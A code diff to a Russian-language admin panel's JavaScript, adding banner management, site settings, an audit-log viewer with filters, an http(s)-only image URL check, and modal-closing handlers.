+        const btn = e.target.closest("[data-action]");
+        if (!btn) return;
+        const banner = allBanners.find((b) => String(b.id) === btn.dataset.id);
+        if (!banner) return;
+        if (btn.dataset.action === "edit-banner") openBannerModal(banner);
+        else if (btn.dataset.action === "delete-banner")
+          deleteBanner(banner.id, banner.title);
+      });
+
+      function openBannerModal(banner = null) {
+        editBannerId = banner ? banner.id : null;
+        $("mBannerTitle").textContent = banner
+          ? "Редактировать баннер"
+          : "Добавить баннер";
+        $("bnTitle").value = banner?.title || "";
+        $("bnSubtitle").value = banner?.subtitle || "";
+        $("bnImageUrl").value = banner?.image_url || "";
+        $("bnImageFile").value = "";
+        $("bnLinkUrl").value = banner?.link_url || "";
+        $("bnSortOrder").value = banner?.sort_order ?? 0;
+        $("bnActive").checked = banner ? banner.is_active : true;
+        renderBannerPreview();
+        $("mBanner").classList.add("open");
+      }
+      function closeMBanner() {
+        $("mBanner").classList.remove("open");
+        editBannerId = null;
+      }
+      function renderBannerPreview() {
+        const url = $("bnImageUrl").value;
+        $("bnImgPreview").innerHTML = isSafeImageUrl(url)
+          ? `<img src="${escHtml(url)}" style="max-width:100%;max-height:120px;border-radius:8px;object-fit:cover" onerror="this.remove()">`
+          : "";
+      }
+      // Uploading replaces the URL field with the freshly stored asset's
+      // URL — the admin never has to hand-type/paste a media URL.
+      $("bnImageFile").addEventListener("change", async function () {
+        if (!this.files || !this.files[0]) return;
+        const fd = new FormData();
+        fd.append("file", this.files[0]);
+        try {
+          const res = await apiUpload("/api/admin/media", fd);
+          $("bnImageUrl").value = API + res.url;
+          renderBannerPreview();
+          toast("Изображение загружено");
+        } catch (e) {
+          toast(e.message, "err");
+        }
+      });
+
+      async function saveBanner() {
+        $("bnSaveBtn").disabled = true;
+        try {
+          const payload = {
+            title: $("bnTitle").value.trim(),
+            subtitle: $("bnSubtitle").value.trim() || null,
+            image_url: $("bnImageUrl").value.trim(),
+            link_url: $("bnLinkUrl").value.trim() || null,
+            sort_order: parseInt($("bnSortOrder").value) || 0,
+            is_active: $("bnActive").checked,
+          };
+          if (!payload.title || !payload.image_url) {
+            toast("Заполните заголовок и изображение", "err");
+            return;
+          }
+          if (editBannerId) {
+            await api(`/api/admin/banners/${editBannerId}`, {
+              method: "PATCH",
+              body: JSON.stringify(payload),
+            });
+            toast("Баннер обновлён");
+          } else {
+            await api("/api/admin/banners", {
+              method: "POST",
+              body: JSON.stringify(payload),
+            });
+            toast("Баннер добавлен");
+          }
+          closeMBanner();
+          loadBanners();
+        } catch (e) {
+          toast(e.message, "err");
+        } finally {
+          $("bnSaveBtn").disabled = false;
+        }
+      }
+
+      async function deleteBanner(id, title) {
+        if (!confirm(`Удалить баннер «${title}»?`)) return;
+        try {
+          await api(`/api/admin/banners/${id}`, { method: "DELETE" });
+          toast("Баннер удалён");
+          loadBanners();
+        } catch (e) {
+          toast(e.message, "err");
+        }
+      }
+
+      // ── SITE SETTINGS ──
+      async function loadSettings() {
+        try {
+          const s = await api("/api/admin/settings");
+          $("stSeoTitle").value = s.seo_title || "";
+          $("stSeoDescription").value = s.seo_description || "";
+          $("stPhone").value = s.contact_phone || "";
+          $("stEmail").value = s.contact_email || "";
+          $("stAddress").value = s.contact_address || "";
+          $("stVk").value = s.vk_url || "";
+          $("stTelegram").value = s.telegram_url || "";
+          $("stLogoUrl").value = s.logo_url || "";
+          $("stMaintenance").checked = s.maintenance_mode;
+          $("stMaintenanceMessage").value = s.maintenance_message || "";
+          renderLogoPreview();
+        } catch (e) {
+          toast(e.message, "err");
+        }
+      }
+      function renderLogoPreview() {
+        const url = $("stLogoUrl").value;
+        $("stLogoPreview").innerHTML = isSafeImageUrl(url)
+          ? `<img src="${escHtml(url)}" style="max-height:60px;border-radius:6px" onerror="this.remove()">`
+          : "";
+      }
+      $("stLogoFile").addEventListener("change", async function () {
+        if (!this.files || !this.files[0]) return;
+        const fd = new FormData();
+        fd.append("file", this.files[0]);
+        try {
+          const res = await apiUpload("/api/admin/media", fd);
+          $("stLogoUrl").value = API + res.url;
+          renderLogoPreview();
+          toast("Логотип загружен");
+        } catch (e) {
+          toast(e.message, "err");
+        }
+      });
+
+      async function saveSettings() {
+        $("stSaveBtn").disabled = true;
+        try {
+          await api("/api/admin/settings", {
+            method: "PATCH",
+            body: JSON.stringify({
+              seo_title: $("stSeoTitle").value.trim(),
+              seo_description: $("stSeoDescription").value.trim(),
+              contact_phone: $("stPhone").value.trim(),
+              contact_email: $("stEmail").value.trim(),
+              contact_address: $("stAddress").value.trim(),
+              vk_url: $("stVk").value.trim(),
+              telegram_url: $("stTelegram").value.trim(),
+              logo_url: $("stLogoUrl").value.trim(),
+              maintenance_mode: $("stMaintenance").checked,
+              maintenance_message: $("stMaintenanceMessage").value.trim(),
+            }),
+          });
+          toast("Настройки сохранены");
+        } catch (e) {
+          toast(e.message, "err");
+        } finally {
+          $("stSaveBtn").disabled = false;
+        }
+      }
+
+      // ── AUDIT LOGS ──
+      let _lgDebounce = null;
+      function debouncedFilterLogs() {
+        clearTimeout(_lgDebounce);
+        _lgDebounce = setTimeout(loadLogs, 300);
+      }
+
+      async function loadLogs() {
+        $("lgBody").innerHTML =
+          '<tr><td colspan="6"><div class="loading-row"><div class="spin"></div></div></td></tr>';
+        try {
+          const params = new URLSearchParams({ limit: "100" });
+          const adminFilter = $("lgAdmin").value.trim();
+          const actionFilter = $("lgAction").value;
+          if (adminFilter) params.set("admin_username", adminFilter);
+          if (actionFilter) params.set("action", actionFilter);
+          const logs = await api("/api/admin/logs?" + params.toString());
+          $("lgBody").innerHTML = logs.length
+            ? logs
+                .map(
+                  (l) => `
+      <tr>
+        <td class="td-m">${fmtFull(l.created_at)}</td>
+        <td style="font-weight:600">${escHtml(l.admin_username)}</td>
+        <td><span class="badge badge-booked">${escHtml(l.action)}</span></td>
+        <td class="td-m">${escHtml(l.target_type)} #${escHtml(l.target_id)}</td>
+        <td style="font-size:.78rem">${escHtml(l.details || "—")}</td>
+        <td class="td-m">${escHtml(l.ip_address || "—")}</td>
+      </tr>`,
+                )
+                .join("")
+            : '<tr><td colspan="6"><div class="empty"><span class="ico">🧾</span>Записей нет</div></td></tr>';
+        } catch (e) {
+          $("lgBody").innerHTML =
+            `<tr><td colspan="6"><div class="empty"><span class="ico">⚠️</span>${escHtml(e.message)}</div></td></tr>`;
+        }
+      }
+
       // ── UTILS ──
       function escHtml(s) {
         if (s == null) return "";
@@ -2656,8 +3541,22 @@
           .replace(/"/g, "&quot;");
       }
 
+      // Only ever render http(s) URLs into a src="" attribute — blocks
+      // javascript:/data:/vbscript: pseudo-protocols from ever reaching
+      // the DOM via an image preview.
+      function isSafeImageUrl(url) {
+        return typeof url === "string" && /^https?:\/\//i.test(url);
+      }
+
       // ── CLOSE MODALS ON BG CLICK ──
-      [$("mBooking"), $("mTour"), $("mUser")].forEach((m) => {
+      [
+        $("mBooking"),
+        $("mTour"),
+        $("mUser"),
+        $("mResetPwd"),
+        $("mContent"),
+        $("mBanner"),
+      ].forEach((m) => {
         if (m)
           m.addEventListener("click", (e) => {
             if (e.target === m) m.classList.remove("open");
@@ -2667,7 +3566,14 @@
       // ── ESC key closes modals ──
       document.addEventListener("keydown", (e) => {
         if (e.key === "Escape") {
-          [$("mBooking"), $("mTour"), $("mUser")].forEach((m) => {
+          [
+            $("mBooking"),
+            $("mTour"),
+            $("mUser"),
+            $("mResetPwd"),
+            $("mContent"),
+            $("mBanner"),
+          ].forEach((m) => {
             if (m) m.classList.remove("open");
           });
         }
